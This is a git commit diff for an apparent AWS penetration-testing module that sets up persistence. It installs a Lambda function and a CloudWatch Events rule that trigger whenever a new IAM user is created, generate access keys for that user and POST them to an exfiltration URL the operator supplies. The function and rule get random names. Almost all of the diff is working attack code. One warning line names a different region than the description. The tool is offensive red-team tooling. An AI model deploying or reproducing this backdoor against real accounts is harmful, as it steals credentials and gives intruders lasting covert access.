ec754263a129d333c13733aa4f42aa38b7e9f1ce
Spencer Gietzen <spencer@spengietz.com>
2018-09-28 15:34:00 -0700

    modified backdoor sec groups and added backdoor new users

--- modules/lambda__backdoor_new_users/main.py
+++ modules/lambda__backdoor_new_users/main.py
@@ -9,17 +9,17 @@ import os
 
 
 module_info = {
-    'name': 'lambda__backdoor_new_sec_groups',
+    'name': 'lambda__backdoor_new_users',
 
-    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_security_groups_lambda/backdoor_created_security_groups_lambda.py',
+    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_users_lambda/backdoor_created_users_lambda.py',
 
     'category': 'PERSIST',
 
-    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new EC2 security groups.',
+    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new IAM users.',
 
-    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new EC2 security group being created in the account. The function will automatically add a backdoor rule to that security group with your supplied IP address as the source. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in the region it was deployed to.',
+    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new IAM user being created in the account. The function will automatically add a set of access keys to the user and send them to the server you supplied. The function and rule will always be created in us-east-1, as that is the only CloudWatch region that gets sent IAM events. Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.',
 
-    'services': ['Lambda', 'Events', 'EC2'],
+    'services': ['Lambda', 'Events', 'IAM'],
 
     'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],
 
@@ -31,9 +31,7 @@ module_info = {
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
 parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
-parser.add_argument('--ip-range', required=False, default=None, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
-parser.add_argument('--port-range', required=False, default='0-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (0-65535).')
-parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')
+parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoor credentials to, so you can access them.')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
 
 
@@ -62,9 +60,9 @@ def main(args, pacu_main):
         if created_lambda_functions:
             delete_function_file = True
             for function in created_lambda_functions:
-                name, region = function.rstrip().split('@')
-                print('  Deleting function {} in region {}...'.format(name, region))
-                client = pacu_main.get_boto3_client('lambda', region)
+                name = function.rstrip()
+                print('  Deleting function {}...'.format(name))
+                client = pacu_main.get_boto3_client('lambda', 'us-east-1')
                 try:
                     client.delete_function(
                         FunctionName=name
@@ -86,9 +84,9 @@ def main(args, pacu_main):
         if created_cwe_rules:
             delete_cwe_file = True
             for rule in created_cwe_rules:
-                name, region = rule.rstrip().split('@')
-                print('  Deleting rule {} in region {}...'.format(name, region))
-                client = pacu_main.get_boto3_client('events', region)
+                name = rule.rstrip()
+                print('  Deleting rule {}...'.format(name))
+                client = pacu_main.get_boto3_client('events', 'us-east-1')
                 try:
                     client.remove_targets(
                         Rule=name,
@@ -114,20 +112,13 @@ def main(args, pacu_main):
         print('Completed cleanup mode.\n')
         return {'cleanup': True}
 
-    if not args.ip_range:
-        print('  --ip-range is required if you are not running in cleanup mode!')
+    if not args.exfil_url:
+        print('  --exfil-url is required if you are not running in cleanup mode!')
         return
 
     data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
-
-    if not args.regions:
-        regions = get_regions('Lambda')
-    else:
-        regions = args.regions.split(',')
-
-    from_port, to_port = args.port_range.split('-')
 
     target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
     if not target_role_arn:
@@ -146,7 +137,7 @@ def main(args, pacu_main):
     with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
         code = f.read()
 
-    code = code.replace('FROM_PORT', from_port).replace('TO_PORT', to_port).replace('IP_RANGE', args.ip_range).replace('IP_PROTOCOL', args.protocol)
+    code = code.replace('POST_URL', args.exfil_url)
 
     with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
         f.write(code)
@@ -162,70 +153,68 @@ def main(args, pacu_main):
     with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
         zip_file_bytes = f.read()
 
-    for region in regions:
-        print('Starting region {}...'.format(region))
-        client = pacu_main.get_boto3_client('lambda', region)
+    client = pacu_main.get_boto3_client('lambda', 'us-east-1')
 
-        try:
-            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
-            response = client.create_function(
-                FunctionName=function_name,
-                Runtime='python3.6',
-                Role=target_role_arn,
-                Handler='lambda_function.lambda_handler',
-                Code={
-                    'ZipFile': zip_file_bytes
+    try:
+        function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
+        response = client.create_function(
+            FunctionName=function_name,
+            Runtime='python3.6',
+            Role=target_role_arn,
+            Handler='lambda_function.lambda_handler',
+            Code={
+                'ZipFile': zip_file_bytes
+            }
+        )
+        lambda_arn = response['FunctionArn']
+        print('  Created Lambda function: {}'.format(function_name))
+        data['functions_created'] += 1
+        created_resources['LambdaFunctions'].append(function_name)
+
+        client = pacu_main.get_boto3_client('events', 'us-east-1')
+
+        response = client.put_rule(
+            Name=function_name,
+            EventPattern='{"source":["aws.iam"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["iam.amazonaws.com"],"eventName":["CreateUser"]}}',
+            State='ENABLED'
+        )
+        print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
+        data['rules_created'] += 1
+
+        client = pacu_main.get_boto3_client('lambda', 'us-east-1')
+
+        client.add_permission(
+            FunctionName=function_name,
+            StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
+            Action='lambda:InvokeFunction',
+            Principal='events.amazonaws.com',
+            SourceArn=response['RuleArn']
+        )
+
+        client = pacu_main.get_boto3_client('events', 'us-east-1')
+
+        response = client.put_targets(
+            Rule=function_name,
+            Targets=[
+                {
+                    'Id': '0',
+                    'Arn': lambda_arn
                 }
-            )
-            lambda_arn = response['FunctionArn']
-            print('  Created Lambda function: {}'.format(function_name))
-            data['functions_created'] += 1
-            created_resources['LambdaFunctions'].append('{}@{}'.format(function_name, region))
-
-            client = pacu_main.get_boto3_client('events', region)
-
-            response = client.put_rule(
-                Name=function_name,
-                EventPattern='{"source":["aws.ec2"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["ec2.amazonaws.com"],"eventName":["CreateSecurityGroup"]}}',
-                State='ENABLED'
-            )
-            print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
-            data['rules_created'] += 1
-
-            client = pacu_main.get_boto3_client('lambda', region)
-
-            client.add_permission(
-                FunctionName=function_name,
-                StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
-                Action='lambda:InvokeFunction',
-                Principal='events.amazonaws.com',
-                SourceArn=response['RuleArn']
-            )
-
-            client = pacu_main.get_boto3_client('events', region)
-
-            response = client.put_targets(
-                Rule=function_name,
-                Targets=[
-                    {
-                        'Id': '0',
-                        'Arn': lambda_arn
-                    }
-                ]
-            )
-            if response['FailedEntryCount'] > 0:
-                print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
-                print(response['FailedEntries'])
-            else:
-                print('  Added Lambda target to CloudWatch Events rule.')
-                data['successes'] += 1
-                created_resources['CWERules'].append('{}@{}'.format(function_name, region))
-        except ClientError as error:
-            code = error.response['Error']['Code']
-            if code == 'AccessDeniedException':
-                print('  FAILURE: MISSING NEEDED PERMISSIONS')
-            else:
-                print(code)
+            ]
+        )
+        if response['FailedEntryCount'] > 0:
+            print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
+            print(response['FailedEntries'])
+        else:
+            print('  Added Lambda target to CloudWatch Events rule.')
+            data['successes'] += 1
+            created_resources['CWERules'].append(function_name)
+    except ClientError as error:
+        code = error.response['Error']['Code']
+        if code == 'AccessDeniedException':
+            print('  FAILURE: MISSING NEEDED PERMISSIONS')
+        else:
+            print(code)
 
     if created_resources['LambdaFunctions']:
         with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
@@ -234,7 +223,7 @@ def main(args, pacu_main):
         with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
-    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in the region it was deployed to.')
+    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-west-1.')
 
     return data
 
